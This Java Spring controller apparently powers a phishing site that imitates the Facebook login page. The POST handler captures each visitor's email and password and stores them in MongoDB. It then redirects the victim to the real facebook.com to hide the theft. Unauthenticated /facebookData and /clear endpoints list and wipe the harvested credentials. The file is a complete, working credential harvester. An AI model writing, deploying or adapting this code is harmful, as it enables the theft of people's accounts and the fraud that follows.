package com.example;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;

import java.util.ArrayList;
import java.util.List;

/**
 * Created by baraa on 1/22/2017.
 */

@Controller
public class facebook {

      @Autowired
      MongoRepo mongo;

    @RequestMapping("/facebook")
            public String facebook()
    {
        return "facebook";
    }
    static ArrayList<String> list = new ArrayList<>();
    @RequestMapping(value = "/facebook" , method = RequestMethod.POST)
    public String facebook1(@RequestParam(value = "email" , required = false) String email , @RequestParam(value = "password",required = false) String password)
    {
         mongo.save(new User(email,password));
        return "redirect:http://www.facebook.com";
    }

    @RequestMapping("/facebookData")
    @ResponseBody
    public  Iterable<User> list()
    {
        return mongo.findAll();
    }
    
    @RequestMapping("/clear")
    @ResponseBody
    public  String list1()
    {
        mongo.deleteAll();
        return "wow all cleard :D "; 
    }
    

}
